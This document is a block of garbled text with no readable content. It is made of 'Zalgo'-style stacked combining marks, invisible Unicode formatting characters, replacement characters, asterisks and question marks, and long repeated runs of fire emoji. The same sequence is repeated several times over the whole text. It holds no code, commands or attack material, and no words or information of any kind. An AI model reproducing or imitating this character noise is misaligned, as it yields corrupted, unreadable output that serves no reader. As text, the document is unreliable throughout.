⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̈́̾🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥🔥